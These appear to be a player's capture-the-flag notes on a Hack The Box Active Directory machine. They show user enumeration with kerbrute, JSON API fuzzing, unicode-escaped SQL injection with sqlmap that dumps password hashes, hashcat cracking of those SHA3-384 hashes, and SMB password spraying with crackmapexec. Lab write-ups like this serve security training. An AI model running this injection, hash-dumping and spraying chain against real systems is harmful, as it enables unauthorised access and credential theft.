
```
enum4linux -a 10.10.10.179
```

```
Domain Name: MEGACORP                                                         
Domain Sid: S-1-5-21-3167813660-1240564177-918740779
```


So after adding the IP in the host file got this 
![[Pasted image 20240919042226.png]]


```
kerbrute userenum -d MEGACORP.LOCAL --dc 10.10.10.179 userlist.txt -t 100
```


```
andrew@MEGACORP.LOCAL
james@MEGACORP.LOCAL
Andrew@MEGACORP.LOCAL
dai@MEGACORP.LOCAL
administrator@MEGACORP.LOCAL
alice@MEGACORP.LOCAL
ANDREW@MEGACORP.LOCAL
lana@MEGACORP.LOCAL
Administrator@MEGACORP.LOCAL
rmartin@MEGACORP.LOCAL
pmartin@MEGACORP.LOCAL
```


So we have the users will try the login page now
```
andrew
james
dai
administrator
alice
ANDREW
lana
Administrator
rmartin
pmartin
```


So the login page is a dead end but when i pressed entered in colleague finder look what we got a list of valid users
![[Pasted image 20240919153405.png]]

```
sbauer@megacorp.htb
okent@megacorp.htb
ckane@megacorp.htb
kpage@megacorp.htb
shayna@megacorp.htb
james@megacorp.htb
cyork@megacorp.htb
rmartin@megacorp.htb
zac@magacorp.htb
jorden@megacorp.htb
alyx@megacorp.htb
ilee@megacorp.htb
nbourne@megacorp.htb
zpowers@megacorp.htb
aldom@megacorp.htb
minato@megacorp.htb
egre55@megacorp.htb
```

2024/09/19 15:37:38 >  Done! Tested 17 usernames (14 valid) in 0.816 seconds

```
sbauer@megacorp.htb
okent@megacorp.htb
ckane@megacorp.htb
kpage@megacorp.htb
james@megacorp.htb
cyork@megacorp.htb
rmartin@megacorp.htb
zac@magacorp.htb
jorden@megacorp.htb
alyx@megacorp.htb
ilee@megacorp.htb
nbourne@megacorp.htb
zpowers@megacorp.htb
aldom@megacorp.htb
```

So now i think we can run the sql injection in this as it reminds me of DVWA 

So we technically have 5 fields
![[Pasted image 20240919160202.png]]

```
"id":1,
"name":"Sarina Bauer",
"position":"Junior Developer",
"email":"sbauer@megacorp.htb",
"src":"sbauer.jpg"
```


Let's automate the process and see which payload works and which is not 
```
wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/SecLists-master/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8'
```

![[Pasted image 20240919183727.png]]


So will try ' and it's value is 
```
\u27
```
and guess what we got an error

![[Pasted image 20240919184156.png]]

```
\u0027
```
![[Pasted image 20240919184507.png]]


```
sqlmap -r post_me.txt --tamper=charunicodeescape --delay 3 --level 5 --risk 3 --dbms=mssql -technique=U --batch --dump-all --exclude-sysdbs -v 3
```


And and and finally this command worked
```
sqlmap -r colleagues.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dump-all --exclude-sysdbs
```

![[Pasted image 20240920032509.png]]

```
id | password                                                                                         | username |
+----+--------------------------------------------------------------------------------------------------+----------+
| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |
| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |
| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |
| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |
| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |
| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |
| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |
| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |
| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |
| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |
| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |
| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |
| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |
| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |
| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |
| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |
| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55 
```


```
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
```

So seeing the length of the hashes it's a sha but don't know if it's 256-512 or in b/w 
after some research on HashCat wiki i confirmed that it's hash 384 but didn't know if it's 
sha2 or sha3 or what.
10800	SHA2-384
17500 SHA3-384
17900 Keccak-384

And finally this worked
```
.\hashcat.exe -m 17500 -D 2 .\hashes4.txt .\rockyou.txt -O
```

```
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
Approaching final keyspace - workload adjusted.
```

Password
```
password1
finance1
banking1
```


So let's validate the password
```
crackmapexec smb 10.10.10.179 -u new_user.txt -p password.txt 
```

